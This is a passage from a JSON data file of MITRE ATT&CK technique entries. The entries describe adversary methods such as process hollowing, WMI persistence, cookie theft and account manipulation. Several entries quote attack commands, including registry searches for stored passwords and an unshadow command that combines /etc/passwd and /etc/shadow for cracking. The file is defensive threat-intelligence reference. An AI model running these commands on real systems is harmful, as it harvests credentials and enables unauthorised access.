reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. \", \"modified\": \"2020-10-21T02:41:11.743Z\", \"id\": \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\"}, \"attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-10-04T20:42:28.541Z\", \"name\": \"System Shutdown/Reboot\", \"attack_pattern_identifier\": \"T1529\", \"modified\": \"2020-03-27T21:18:48.149Z\", \"description\": \"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\\n\\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)\", \"id\": \"attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc\"}, \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:27:15.774Z\", \"name\": \"SSH\", \"attack_pattern_identifier\": \"T1021.004\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\\n\\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.(Citation: SSH Secure Shell)\", \"modified\": \"2020-03-23T23:43:46.977Z\", \"id\": \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\"}, \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T14:07:56.276Z\", \"name\": \"Windows Management Instrumentation Event Subscription\", \"attack_pattern_identifier\": \"T1546.003\", \"description\": \"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015)\\n\\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)\\n\\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\", \"modified\": \"2020-05-05T12:02:45.522Z\", \"id\": \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\"}, \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T20:26:49.433Z\", \"name\": \"Hidden Window\", \"attack_pattern_identifier\": \"T1564.003\", \"description\": \"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \\n\\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\\n\\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\\n\\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)\", \"modified\": \"2020-03-29T22:49:43.557Z\", \"id\": \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\"}, \"attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-14T17:21:54.470Z\", \"name\": \"Process Hollowing\", \"attack_pattern_identifier\": \"T1055.012\", \"description\": \"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \\n\\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Endgame Process Injection July 2017)\\n\\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. \", \"modified\": \"2020-06-20T22:28:08.758Z\", \"id\": \"attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4\"}, \"attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:08:26.480Z\", \"name\": \"Domain Account\", \"attack_pattern_identifier\": \"T1087.002\", \"description\": \"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\\n\\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.\", \"modified\": \"2020-03-26T13:42:34.402Z\", \"id\": \"attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af\"}, \"attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T02:14:18.044Z\", \"name\": \"Digital Certificates\", \"attack_pattern_identifier\": \"T1588.004\", \"description\": \"Before compromising a victim, adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\\n\\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise)\\n\\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\\n\\nAdversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\", \"modified\": \"2020-10-22T18:18:54.959Z\", \"id\": \"attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421\"}, \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:25.584Z\", \"name\": \"Query Registry\", \"attack_pattern_identifier\": \"T1012\", \"description\": \"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\\n\\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"modified\": \"2020-03-26T18:08:20.049Z\", \"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\"}, \"attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-19T16:54:28.516Z\", \"name\": \"Exchange Email Delegate Permissions\", \"attack_pattern_identifier\": \"T1098.002\", \"description\": \"Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018)\\n\\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)\", \"modified\": \"2020-05-04T19:18:36.254Z\", \"id\": \"attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306\"}, \"attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-03-29T19:00:55.901Z\", \"name\": \"Service Stop\", \"attack_pattern_identifier\": \"T1489\", \"description\": \"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \\n\\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)\", \"modified\": \"2020-07-24T15:36:08.042Z\", \"id\": \"attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b\"}, \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Access Token Manipulation\", \"attack_pattern_identifier\": \"T1134\", \"description\": \"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\\n\\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\\n\\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.\", \"modified\": \"2020-04-16T19:37:02.355Z\", \"id\": \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\"}, \"attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-10-08T20:04:35.508Z\", \"name\": \"Steal Web Session Cookie\", \"attack_pattern_identifier\": \"T1539\", \"description\": \"An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\\n\\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\\n\\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\\n\\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding web application.\", \"modified\": \"2020-04-21T15:26:25.584Z\", \"id\": \"attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff\"}, \"attack-pattern--635cbe30-392d-4e27-978e-66774357c762\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-28T13:50:22.506Z\", \"name\": \"Local Account\", \"attack_pattern_identifier\": \"T1136.001\", \"description\": \"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account.\\n\\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\", \"modified\": \"2020-03-23T18:04:20.780Z\", \"id\": \"attack-pattern--635cbe30-392d-4e27-978e-66774357c762\"}, \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:08.479Z\", \"name\": \"Proxy\", \"attack_pattern_identifier\": \"T1090\", \"description\": \"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\\n\\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.\", \"modified\": \"2020-10-21T17:54:28.531Z\", \"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\"}, \"attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T20:32:20.810Z\", \"name\": \"Disable or Modify Tools\", \"attack_pattern_identifier\": \"T1562.001\", \"modified\": \"2020-03-29T21:52:43.151Z\", \"description\": \"Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.\", \"id\": \"attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579\"}, \"attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-04T12:58:40.678Z\", \"name\": \"Credentials in Registry\", \"attack_pattern_identifier\": \"T1552.002\", \"description\": \"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\\n\\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\\n\\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>\", \"modified\": \"2020-02-07T20:49:18.834Z\", \"id\": \"attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580\"}, \"attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:12.196Z\", \"name\": \"Account Manipulation\", \"attack_pattern_identifier\": \"T1098\", \"description\": \"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.\", \"modified\": \"2020-10-05T16:43:29.473Z\", \"id\": \"attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27\"}, \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T16:59:59.688Z\", \"name\": \"Winlogon Helper DLL\", \"attack_pattern_identifier\": \"T1547.004\", \"modified\": \"2020-04-21T16:00:41.277Z\", \"description\": \"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\\\Software[\\\\\\\\Wow6432Node\\\\\\\\]\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\</code> and <code>HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \\n\\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\\n\\n* Winlogon\\\\Notify - points to notification package DLLs that handle Winlogon events\\n* Winlogon\\\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\\n* Winlogon\\\\Shell - points to explorer.exe, the system shell executed when a user logs on\\n\\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.\", \"id\": \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\"}, \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Deobfuscate/Decode Files or Information\", \"attack_pattern_identifier\": \"T1140\", \"description\": \"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\\n\\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)\", \"modified\": \"2020-07-09T14:42:23.122Z\", \"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\"}, \"attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T01:41:08.652Z\", \"name\": \"Code Signing Certificates\", \"attack_pattern_identifier\": \"T1587.002\", \"description\": \"Before compromising a victim, adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\\n\\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.\", \"modified\": \"2020-10-15T01:15:54.945Z\", \"id\": \"attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf\"}, \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:04.307Z\", \"name\": \"System Information Discovery\", \"attack_pattern_identifier\": \"T1082\", \"modified\": \"2020-03-26T18:17:42.298Z\", \"description\": \"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\\n\\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\", \"id\": \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\"}, \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2019-11-27T14:58:00.429Z\", \"name\": \"Scheduled Task\", \"attack_pattern_identifier\": \"T1053.005\", \"description\": \"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\\n\\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At (Windows)](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\\n\\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\", \"modified\": \"2020-03-24T13:45:03.730Z\", \"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\"}, \"attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Network Share Discovery\", \"attack_pattern_identifier\": \"T1135\", \"description\": \"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \\n\\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.\", \"modified\": \"2020-10-07T18:10:06.463Z\", \"id\": \"attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f\"}, \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-09-16T17:52:44.147Z\", \"name\": \"Software Discovery\", \"attack_pattern_identifier\": \"T1518\", \"description\": \"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).\", \"modified\": \"2020-09-16T19:36:17.133Z\", \"id\": \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\"}, \"attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:29:51.508Z\", \"name\": \"Visual Basic\", \"attack_pattern_identifier\": \"T1059.005\", \"description\": \"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\\n\\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\\n\\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.\", \"modified\": \"2020-08-13T20:09:39.122Z\", \"id\": \"attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67\"}, \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:46:56.263Z\", \"name\": \"/etc/passwd and /etc/shadow\", \"attack_pattern_identifier\": \"T1003.008\", \"description\": \"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\\n\\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\\n\", \"modified\": \"2020-03-20T15:56:55.022Z\", \"id\": \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\"}, \"attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-10T19:49:46.752Z\", \"name\": \"Invalid Code Signature\", \"attack_pattern_identifier\": \"T1036.001\", \"modified\": \"2020-02-10T19:52:47.724Z\", \"description\": \"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)\\n\\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.\", \"id\": \"attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52\"}, \"attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:25.967Z\", \"name\": \"Clipboard Data\", \"attack_pattern_identifier\": \"T1115\", \"description\": \"Adversaries may collect data stored in the clipboard from users copying information within or between applications. \\n\\nIn Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)\", \"modified\": \"2020-04-23T18:35:58.230Z\", \"id\": \"attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f\"}, \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:55.892Z\", \"name\": \"Indicator Removal on Host\", \"attack_pattern_identifier\": \"T1070\", \"description\": \"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/*.\\n\\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to 